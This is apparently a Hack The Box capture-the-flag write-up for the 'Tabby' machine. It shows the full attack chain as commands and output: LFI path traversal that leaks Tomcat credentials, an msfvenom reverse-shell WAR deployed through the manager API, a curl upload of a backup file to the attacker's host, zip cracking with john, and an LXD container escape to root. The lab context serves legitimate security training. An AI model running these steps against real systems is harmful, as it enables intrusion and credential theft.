
### Initial access
Nmap
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
To check vuln using ffuz
```
ffuf -u http://megahosting.htb/news.php?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 50 -e php,asp,aspx,jsp,html,txt,json  -fs 0 
```
We see file LFI exploit on port  80 web
```
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ curl http://megahosting.htb/news.php?file=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
                                            
```
 Using it read file config of apache tomcat on port 8080
Check in the internet for finding possilbe we have word list
```
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ ffuf -u http://megahosting.htb/news.php?file=../../../../../../../../../../../../../../../../../../../../../../FUZZ  -w  tomcat-wordlist -t 50 -fs 0 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://megahosting.htb/news.php?file=../../../../../../../../../../../../../../../../../../../../../../FUZZ
 :: Wordlist         : FUZZ: /home/kali/HTB/Tabby/tomcat-wordlist
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

/usr/share/tomcat9/etc/tomcat-users.xml [Status: 200, Size: 2325, Words: 361, Lines: 48, Duration: 76ms]
:: Progress: [22/22] :: Job [1/1] :: 6 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ cat tomcat-wordlist 
/etc/tomcat9/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml
/usr/share/tomcat9/conf/tomcat-users.xml
/var/lib/tomcat9/conf/tomcat-users.xml
/etc/tomcat10/tomcat-users.xml
/usr/share/tomcat10/etc/tomcat-users.xml
/usr/share/tomcat10/conf/tomcat-users.xml
/var/lib/tomcat10/conf/tomcat-users.xml
/etc/tomcat8/tomcat-users.xml
/usr/share/tomcat8/etc/tomcat-users.xml
/usr/share/tomcat8/conf/tomcat-users.xml
/var/lib/tomcat8/conf/tomcat-users.xml
/etc/tomcat/tomcat-users.xml
/usr/share/tomcat/conf/tomcat-users.xml
/usr/local/tomcat/conf/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xml
/opt/tomcat9/conf/tomcat-users.xml
/opt/tomcat10/conf/tomcat-users.xml
/var/www/tomcat-users.xml
C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf\tomcat-users.xml
C:\Program Files\Apache Software Foundation\Tomcat 10.0\conf\tomcat-users.xml
C:\tomcat\conf\tomcat-users.xml

```

We have apache cred
```
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ curl http://megahosting.htb/news.php?file=../../../../../../../../../../../../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>

```

Cred: `tomcat:$3cureP4s5w0rd123!`

We have `manager-script` this is to use api to upload shell and the gui cant

```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.17.47 LPORT=4444 -f war -o shell.war
```


```
curl -u 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/demo&update=true"

```

```bash
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ curl -u 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/demo&update=true" 
OK - Deployed application at context path [/demo]
                                                                        
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ curl http://megahosting.htb:8080/demo/



```

```bash
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Tabby]
                             └─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.37.83] 36718


```

```
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ penelope --oscp-safe --no-log -p 4444

[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => tabby 10.129.37.83 Linux-x86_64 👤 tomcat(997) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
tomcat@tabby:/var/lib/tomcat9$ 


```
### Lateral Movement
After run linpeas see the backup file in web root
```bash
uploadserver 6666  
///
 curl -F "file=/var/www/html/files/16162020_backup.zip" http://10.10.17.47:6666/upload
```
Crack the zip pass
```
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ zip2john 16162020_backup.zip > zip.hash
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Tabby]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:00 DONE (2026-09-10 02:52) 1.818g/s 18856Kp/s 18856Kc/s 18856KC/s adornadis..adamsapple:)1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                      
```
use that to ash and we get new cred
`ash:admin@it `


### Priv escalation
So we see user  have lxd which like container escape
```
ash@tabby:/tmp$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)

```

Follow hackstrick we using this 
```
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

```

```
ash@tabby:~$ lxc start mycontainer
ash@tabby:~$ lxc exec mycontainer /bin/sh
/mnt/root # cd root
/mnt/root/root # ls
root.txt  snap
/mnt/root/root # cat  root.txt
9cd0685fb3c37d25781c138997b8bc8a
```

